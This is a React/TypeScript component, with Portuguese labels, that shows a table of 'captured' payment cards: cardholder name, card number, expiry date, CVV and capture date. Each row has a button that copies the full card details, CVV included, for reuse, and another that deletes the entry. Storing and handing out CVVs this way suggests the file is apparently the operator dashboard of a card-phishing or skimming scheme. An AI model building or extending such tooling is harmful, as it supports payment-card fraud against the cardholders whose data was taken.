
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { CardBrandBadge } from "./CardBrandBadge";
import { Skeleton } from "@/components/ui/skeleton";
import { Copy, Trash2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";

interface CapturedCard {
  id: number;
  nome_cliente: string;
  numero_cartao: string;
  validade: string;
  cvv: string;
  criado_em: string;
  bandeira: string;
}

interface CardCaptureTableProps {
  cards: CapturedCard[];
  formatDate: (dateString: string) => string;
  isLoading?: boolean;
  onDeleteCard: (id: number) => Promise<void>;
}

export const CardCaptureTable = ({ 
  cards, 
  formatDate, 
  isLoading = false,
  onDeleteCard 
}: CardCaptureTableProps) => {
  
  const copyToClipboard = (text: string, type: string) => {
    navigator.clipboard.writeText(text).then(() => {
      toast.success(`${type} copiado para a área de transferência`);
    }).catch(() => {
      toast.error(`Erro ao copiar ${type}`);
    });
  };

  if (isLoading) {
    return (
      <div className="space-y-2">
        <Skeleton className="h-10 w-full" />
        <Skeleton className="h-10 w-full" />
        <Skeleton className="h-10 w-full" />
        <Skeleton className="h-10 w-full" />
        <Skeleton className="h-10 w-full" />
      </div>
    );
  }

  const formatCardNumber = (number: string) => {
    const last4 = number.slice(-4);
    const masked = number.slice(0, -4).replace(/\d/g, '*');
    return `${masked}${last4}`;
  };

  return (
    <div className="overflow-x-auto">
      <Table>
        <TableHeader>
          <TableRow>
            <TableHead>Nome</TableHead>
            <TableHead>Número do Cartão</TableHead>
            <TableHead>Validade</TableHead>
            <TableHead>CVV</TableHead>
            <TableHead>Bandeira</TableHead>
            <TableHead>Data de Captura</TableHead>
            <TableHead className="text-right">Ações</TableHead>
          </TableRow>
        </TableHeader>
        <TableBody>
          {cards.length > 0 ? (
            cards.map((card) => (
              <TableRow key={card.id}>
                <TableCell className="font-medium">{card.nome_cliente}</TableCell>
                <TableCell className="font-mono">
                  <span className="relative group">
                    {formatCardNumber(card.numero_cartao)}
                    <Button 
                      variant="ghost" 
                      size="icon" 
                      className="h-6 w-6 absolute -right-6 opacity-0 group-hover:opacity-100 transition-opacity"
                      onClick={() => copyToClipboard(card.numero_cartao, "Número do cartão")}
                    >
                      <Copy size={12} />
                    </Button>
                  </span>
                </TableCell>
                <TableCell>{card.validade}</TableCell>
                <TableCell>{card.cvv}</TableCell>
                <TableCell><CardBrandBadge bandeira={card.bandeira} /></TableCell>
                <TableCell>{formatDate(card.criado_em)}</TableCell>
                <TableCell className="text-right flex justify-end items-center gap-2">
                  <Button 
                    variant="ghost" 
                    size="sm" 
                    className="h-8"
                    onClick={() => {
                      const cardData = `Nome: ${card.nome_cliente}\nNúmero: ${card.numero_cartao}\nValidade: ${card.validade}\nCVV: ${card.cvv}`;
                      copyToClipboard(cardData, "Dados do cartão");
                    }}
                  >
                    <Copy size={14} className="mr-2" />
                    Copiar
                  </Button>
                  
                  <AlertDialog>
                    <AlertDialogTrigger asChild>
                      <Button 
                        variant="destructive" 
                        size="sm" 
                        className="h-8"
                      >
                        <Trash2 size={14} className="mr-2" />
                        Apagar
                      </Button>
                    </AlertDialogTrigger>
                    <AlertDialogContent>
                      <AlertDialogHeader>
                        <AlertDialogTitle>Apagar Cartão</AlertDialogTitle>
                        <AlertDialogDescription>
                          Tem certeza que deseja apagar este cartão? Esta ação não pode ser desfeita.
                        </AlertDialogDescription>
                      </AlertDialogHeader>
                      <AlertDialogFooter>
                        <AlertDialogCancel>Cancelar</AlertDialogCancel>
                        <AlertDialogAction 
                          onClick={() => onDeleteCard(card.id)}
                          className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
                        >
                          Apagar
                        </AlertDialogAction>
                      </AlertDialogFooter>
                    </AlertDialogContent>
                  </AlertDialog>
                </TableCell>
              </TableRow>
            ))
          ) : (
            <TableRow>
              <TableCell colSpan={7} className="text-center py-6 text-muted-foreground">
                Nenhum cartão encontrado.
              </TableCell>
            </TableRow>
          )}
        </TableBody>
      </Table>
    </div>
  );
}
